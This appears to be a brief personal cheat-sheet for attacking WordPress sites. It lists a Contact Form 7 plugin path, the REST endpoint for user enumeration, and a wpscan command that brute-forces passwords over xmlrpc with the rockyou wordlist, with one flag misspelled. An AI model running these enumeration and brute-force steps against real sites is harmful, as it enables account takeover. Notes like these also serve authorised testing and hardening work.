# wordpress

# wordpress contact form 7 vuln
```
/wp-content/plugins/contact-form-7/
```
# Username Enumeration slugs 
```
/wp-json/wp/v2/users
```
# attack Brute force via Enumeration
```
wpscan --url https://test.com -U 'user1,user2' -P /usr/share/wordlist/rockyou.txt --password-attac xmlrpc
```
